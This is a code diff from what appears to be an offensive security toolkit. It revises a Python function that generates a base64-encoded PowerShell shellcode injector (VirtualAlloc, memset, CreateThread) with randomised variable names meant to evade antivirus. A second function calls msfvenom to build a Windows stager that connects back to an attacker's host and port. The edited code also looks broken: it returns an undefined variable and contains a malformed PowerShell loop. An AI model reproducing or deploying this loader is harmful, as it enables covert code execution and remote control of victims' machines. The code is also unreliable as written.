@@ -1512,41 +1512,39 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
 
     except Exception as e:
         print_error("Something went wrong, printing error: " + str(e))
-    # powershell command here, needs to be unicoded then base64 in order to
-    # use encodedcommand - this incorporates a new process downgrade attack
-    # where if it detects 64 bit it'll use x86 powershell. This is useful so
-    # we don't have to guess if its x64 or x86 and what type of shellcode to
-    # use
+
     # added random vars before and after to change strings - AV you are
     # seriously ridiculous.
-    var1 = generate_random_string(3, 4)
-    var2 = generate_random_string(3, 4)
-    var3 = generate_random_string(3, 4)
-    var4 = generate_random_string(3, 4)
-    var5 = generate_random_string(3, 4)
-    var6 = generate_random_string(3, 4)
+    var1 = "$" + generate_random_string(2, 2) # $1 
+    var2 = "$" + generate_random_string(2, 2) # $c
+    var3 = "$" + generate_random_string(2, 2) # $2
+    var4 = "$" + generate_random_string(2, 2) # $3
+    var5 = "$" + generate_random_string(2, 2) # $x
+    var6 = "$" + generate_random_string(2, 2) # $t
+    var7 = "$" + generate_random_string(2, 2) # $h
+    var8 = "$" + generate_random_string(2, 2) # $z
+    var9 = "$" + generate_random_string(2, 2) # $g
+    var10 = "$" + generate_random_string(2, 2) # $i
+    var11 = "$" + generate_random_string(2, 2) # $w
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (
-        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-e ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)
+    powershell_code = (r"""$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-ec ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $h"}else{;iex "& powershell $2 $h";}""" % (shellcode))
 
     # run it through a lame var replace
-    powershell_command = powershell_code.replace("$1", "$" + var1).replace(
-        "$c", "$" + var2).replace("$2", "$" + var3).replace("$3", "$" + var4).replace("$x", "$" + var5)
+    powershell_code = powershell_code.replace("$1", var1).replace("$c", var2).replace(
+        "$2", var3).replace("$3", var4).replace("$x", var5).replace("$t", var6).replace(
+        "$h", var7).replace("$z", var8).replace("$g", var9).replace("$i", var10).replace(
+        "$w", var11)
 
     # unicode and base64 encode and return it
     return base64.b64encode(powershell_command.encode('utf_16_le')).decode("ascii")
 
 # generate base shellcode
-
-
 def generate_shellcode(payload, ipaddr, port):
-
     msf_path = meta_path()
     # generate payload
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c" %
-                            (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c" % (msf_path, payload, ipaddr, port), stdout=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     data = data.decode('ascii')
     # start to format this a bit to get it ready
@@ -1557,8 +1555,6 @@ def generate_shellcode(payload, ipaddr, port):
     return data
 
 # this will take input for shellcode and do a replace for IP addresses
-
-
 def shellcode_replace(ipaddr, port, shellcode):
     # split up the ip address
     ip = ipaddr.split('.')
